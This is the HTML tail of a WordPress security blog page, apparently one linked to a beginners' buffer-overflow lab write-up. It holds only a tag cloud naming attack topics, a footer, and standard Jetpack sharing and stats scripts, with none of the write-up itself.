<a href="../../../../tag/pwn/index.html" class="tag-cloud-link tag-link-27 tag-link-position-12" style="font-size: 8pt;" aria-label="pwn (1 item)">pwn</a>
<a href="../../../../tag/re/index.html" class="tag-cloud-link tag-link-26 tag-link-position-13" style="font-size: 8pt;" aria-label="re (1 item)">re</a>
<a href="../../../../tag/side-channel/index.html" class="tag-cloud-link tag-link-29 tag-link-position-14" style="font-size: 8pt;" aria-label="side-channel (1 item)">side-channel</a>
<a href="../../../../tag/sqli/index.html" class="tag-cloud-link tag-link-41 tag-link-position-15" style="font-size: 8pt;" aria-label="sqli (1 item)">sqli</a>
<a href="../../../../tag/unserialize/index.html" class="tag-cloud-link tag-link-40 tag-link-position-16" style="font-size: 8pt;" aria-label="unserialize (1 item)">unserialize</a>
<a href="../../../../tag/xss/index.html" class="tag-cloud-link tag-link-39 tag-link-position-17" style="font-size: 8pt;" aria-label="xss (1 item)">xss</a></div>
</aside>			</div><!-- .widget-area -->
		</div><!-- .sidebar-inner -->
	</div><!-- #tertiary -->

		</div><!-- #main -->
		<footer id="colophon" class="site-footer" role="contentinfo">
			
			<div class="site-info">
								<a href="https://wordpress.org/">Proudly powered by WordPress</a>
			</div><!-- .site-info -->
		</footer><!-- #colophon -->
	</div><!-- #page -->

		<div style="display:none">
	<div class="grofile-hash-map-61a4ede1d517ed9b58991a5c6f9abcdc">
	</div>
	</div>

	<script type="text/javascript">
		window.WPCOM_sharing_counts = {"https:\/\/babyphd.net\/2016\/03\/12\/writeup-for-beginners-bof-vulnerability-lab-syracuse-university\/":486};
	</script>
				<script type='text/javascript' src='../../../../wp-content/plugins/jetpack/_inc/build/photon/photon.min.js%3Fver=20190201'></script>
<script type='text/javascript' src='https://s0.wp.com/wp-content/js/devicepx-jetpack.js?ver=202333'></script>
<script type='text/javascript' src='../../../../wp-content/themes/twentythirteen/js/functions.js%3Fver=20160717'></script>
<script type='text/javascript' src='../../../../wp-includes/js/wp-embed.min.js%3Fver=5.2.2'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var sharing_js_options = {"lang":"en","counts":"1","is_stats_active":"1"};
/* ]]> */
</script>
<script type='text/javascript' src='../../../../wp-content/plugins/jetpack/_inc/build/sharedaddy/sharing.min.js%3Fver=7.5.2'></script>
<script type='text/javascript'>
var windowOpen;
			jQuery( document.body ).on( 'click', 'a.share-twitter', function() {
				// If there's another sharing window open, close it.
				if ( 'undefined' !== typeof windowOpen ) {
					windowOpen.close();
				}
				windowOpen = window.open( jQuery( this ).attr( 'href' ), 'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350' );
				return false;
			});
var windowOpen;
			jQuery( document.body ).on( 'click', 'a.share-facebook', function() {
				// If there's another sharing window open, close it.
				if ( 'undefined' !== typeof windowOpen ) {
					windowOpen.close();
				}
				windowOpen = window.open( jQuery( this ).attr( 'href' ), 'wpcomfacebook', 'menubar=1,resizable=1,width=600,height=400' );
				return false;
			});
</script>
<script type='text/javascript' src='https://stats.wp.com/e-202333.js' async='async' defer='defer'></script>
<script type='text/javascript'>
	_stq = window._stq || [];
	_stq.push([ 'view', {v:'ext',j:'1:7.5.2',blog:'104079289',post:'486',tz:'0',srv:'babyphd.net'} ]);
	_stq.push([ 'clickTrackerInit', '104079289', '486' ]);
</script>
</body>
</html>